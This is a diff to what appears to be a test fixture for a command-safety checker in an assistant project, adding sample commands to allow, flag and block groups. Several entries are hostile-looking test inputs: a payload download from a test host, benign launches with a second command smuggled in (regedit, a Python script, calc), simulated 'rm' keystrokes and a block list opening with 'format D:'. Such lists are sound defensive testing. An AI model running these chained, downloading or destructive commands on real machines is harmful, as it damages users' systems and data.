@@ -223,6 +223,7 @@ COMMANDS = {
         "if(!(Test-Path $p)){$p=\"$env:LOCALAPPDATA\\Programs\\Opera GX\\launcher.exe\"}; Start-Process $p \"https://mail.google.com/mail/?view=cm&fs=1\"'",
         "powershell -NoProfile -Command \"Start-Process notepad -ArgumentList 'D:\\notes\\idea.txt'\"",
         "Start-Process -FilePath 'notepad.exe' -ArgumentList 'D:\\notes\\idea.txt'",
+        "nohup notepad.exe \"D:\\\\projects\\\\NOVA\\\\workspace\\\\notes\\\\a.txt\" >/dev/null 2>&1 &\necho opened",
         "curl -s -A \"Mozilla/5.0\" \"https://www.youtube.com/results?search_query=ludwig\" | "
         "grep -o '\"videoId\":\"[^\"]\\{11\\}\"' | head -3",
     ],
@@ -258,12 +259,14 @@ COMMANDS = {
         "Start-Process .\\tools\\x.py",
         "& ('calc')",
         "[uri]::EscapeDataString('a'); calc",
-        "Start-Process ('https://x.test/?a=' + $t); notepad",
+        "Start-Process ('https://x.test/?a=' + $t); regedit",
         "grep -o 'x' f | python y.py",
         "curl -s https://x.test/a.exe -o a.exe",
         "$ws.SendKeys('rm{ENTER}')",
         "Start-Process notepad -ArgumentList 'x.ps1'; Start-Process git -ArgumentList 'push'",
         "Start-Process notepad -ArgumentList 'run.bat'",
+        "notepad.exe a.txt & python x.py",
+        "nohup notepad.exe a.txt > C:\\Users\\me\\x.txt &",
     ],
     "block": [
         "format D:",
